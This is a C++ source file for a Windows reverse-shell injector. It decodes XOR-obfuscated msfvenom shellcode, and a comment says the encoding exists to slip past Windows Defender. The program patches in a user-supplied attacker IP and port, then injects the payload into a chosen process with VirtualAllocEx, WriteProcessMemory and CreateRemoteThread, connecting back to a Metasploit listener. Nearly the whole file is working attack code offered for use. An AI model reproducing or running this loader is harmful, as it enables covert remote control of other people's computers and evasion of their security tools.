#include <iostream>

#include <Windows.h>
#include <processthreadsapi.h>
#include <handleapi.h>
#include <winsock.h>

#pragma comment(lib, "Ws2_32.lib")

int PORT_OFFSET = 244;
int IP_OFFSET = 246;

// Generated for Windows x64 with msfvenom
// Each byte was XORed with the character 'W' so Windows Defender will not
// find the payload :)
unsigned char buf[] =
"\xab\x1f\xd4\xb3\xa7\xbf\x9b\x57\x57\x57\x16\x06\x16\x07"
"\x05\x06\x01\x1f\x66\x85\x32\x1f\xdc\x05\x37\x1f\xdc\x05"
"\x4f\x1f\xdc\x05\x77\x1f\x58\xe0\x1d\x1d\x1f\xdc\x25\x07"
"\x1a\x66\x9e\x1f\x66\x97\xfb\x6b\x36\x2b\x55\x7b\x77\x16"
"\x96\x9e\x5a\x16\x56\x96\xb5\xba\x05\x1f\xdc\x05\x77\x16"
"\x06\xdc\x15\x6b\x1f\x56\x87\x31\xd6\x2f\x4f\x5c\x55\x58"
"\xd2\x25\x57\x57\x57\xdc\xd7\xdf\x57\x57\x57\x1f\xd2\x97"
"\x23\x30\x1f\x56\x87\xdc\x1f\x4f\x13\xdc\x17\x77\x1e\x56"
"\x87\x07\xb4\x01\x1f\xa8\x9e\x1a\x66\x9e\x16\xdc\x63\xdf"
"\x1f\x56\x81\x1f\x66\x97\xfb\x16\x96\x9e\x5a\x16\x56\x96"
"\x6f\xb7\x22\xa6\x1b\x54\x1b\x73\x5f\x12\x6e\x86\x22\x8f"
"\x0f\x13\xdc\x17\x73\x1e\x56\x87\x31\x16\xdc\x5b\x1f\x13"
"\xdc\x17\x4b\x1e\x56\x87\x16\xdc\x53\xdf\x16\x0f\x1f\x56"
"\x87\x16\x0f\x09\x0e\x0d\x16\x0f\x16\x0e\x16\x0d\x1f\xd4"
"\xbb\x77\x16\x05\xa8\xb7\x0f\x16\x0e\x0d\x1f\xdc\x45\xbe"
"\x1c\xa8\xa8\xa8\x0a\x1e\xe9\x20\x24\x65\x08\x64\x65\x57"
"\x57\x16\x01\x1e\xde\xb1\x1f\xd6\xbb\xf7\x56\x57\x57\x1e"
"\xde\xb2\x1e\xeb\x55\x57\x46\x0b\xfb\x47\x57\x4c\x16\x03"
"\x1e\xde\xb3\x1b\xde\xa6\x16\xed\x1b\x20\x71\x50\xa8\x82"
"\x1b\xde\xbd\x3f\x56\x56\x57\x57\x0e\x16\xed\x7e\xd7\x3c"
"\x57\xa8\x82\x3d\x5d\x16\x09\x07\x07\x1a\x66\x9e\x1a\x66"
"\x97\x1f\xa8\x97\x1f\xde\x95\x1f\xa8\x97\x1f\xde\x96\x16"
"\xed\xbd\x58\x88\xb7\xa8\x82\x1f\xde\x90\x3d\x47\x16\x0f"
"\x1b\xde\xb5\x1f\xde\xae\x16\xed\xce\xf2\x23\x36\xa8\x82"
"\xd2\x97\x23\x5d\x1e\xa8\x99\x22\xb2\xbf\xc4\x57\x57\x57"
"\x1f\xd4\xbb\x47\x1f\xde\xb5\x1a\x66\x9e\x3d\x53\x16\x0f"
"\x1f\xde\xae\x16\xed\x55\x8e\x9f\x08\xa8\x82\xd4\xaf\x57"
"\x29\x02\x1f\xd4\x93\x77\x09\xde\xa1\x3d\x17\x16\x0e\x3f"
"\x57\x47\x57\x57\x16\x0f\x1f\xde\xa5\x1f\x66\x9e\x16\xed"
"\x0f\xf3\x04\xb2\xa8\x82\x1f\xde\x94\x1e\xde\x90\x1a\x66"
"\x9e\x1e\xde\xa7\x1f\xde\x8d\x1f\xde\xae\x16\xed\x55\x8e"
"\x9f\x08\xa8\x82\xd4\xaf\x57\x2a\x7f\x0f\x16\x00\x0e\x3f"
"\x57\x17\x57\x57\x16\x0f\x3d\x57\x0d\x16\xed\x5c\x78\x58"
"\x67\xa8\x82\x00\x0e\x16\xed\x22\x39\x1a\x36\xa8\x82\x1e"
"\xa8\x99\xbe\x6b\xa8\xa8\xa8\x1f\x56\x94\x1f\x7e\x91\x1f"
"\xd2\xa1\x22\xe3\x16\xa8\xb0\x0f\x3d\x57\x0e\x1e\x90\x95"
"\xa7\xe2\xf5\x01\xa8\x82";

int main(int argc, char** argv)
{
    size_t res = 0;
    BOOL ret = FALSE;

    if (argc != 4) {
        std::cout << "Usage: revshell <pid> <ip> <port>\n";
        exit(1);
    }

    int pid = atoi(argv[1]);
    if (pid < 0) {
        std::cout << "Invalid PID\n";
        exit(1);
    }

    unsigned long addr = inet_addr(argv[2]);
    if (addr == INADDR_NONE) {
        std::cout << "Invalid IPv4 address\n";
        exit(1);
    }

    int port = atoi(argv[3]);
    if (port < 1 || port > 65535) {
        std::cout << "Invalid port\n";
        exit(1);
    }

    unsigned short port2 = htons(port);
    
    // unXOR the payload
    for (int i = 0; i < sizeof(buf); i++) {
        buf[i] = buf[i] ^ 'W';
    }

    // Patch the shellcode with user provided IP and port
    memcpy(&buf[PORT_OFFSET], &port2, 2);
    memcpy(&buf[IP_OFFSET], &addr, 4);

    HANDLE thread;
    LPDWORD threadId = NULL;

    HANDLE h = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);

    std::cout << "Handle: " << h << "\n";

    if (h == NULL) {
        std::cout << "Handle is NULL\n";
        exit(-1);
    }

    LPVOID m = VirtualAllocEx(h, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (m != NULL) {
        std::cout << "alloc'ed: " << m << "\n";
    }
    else {
        std::cout << "VirtualALlocEx failed\n";
        goto bye;
    }


    ret = WriteProcessMemory(h, m, buf, sizeof(buf), &res);

    if (ret) {
        std::cout << "Memory written: " << res << " bytes\n";
    }
    else {
        std::cout << "WriteProcessMemory failed\n";
        goto bye;
    }

    thread = CreateRemoteThread(h, NULL, 64 * 1024, (LPTHREAD_START_ROUTINE)m, NULL, 0, threadId);

    if (thread == NULL) {
        std::cout << "CreateRemoteThread failed\n";
        goto bye;
    }

    std::cout << "Check you Metasploit console :)\n";

bye:
    CloseHandle(h);

    return (0);
}
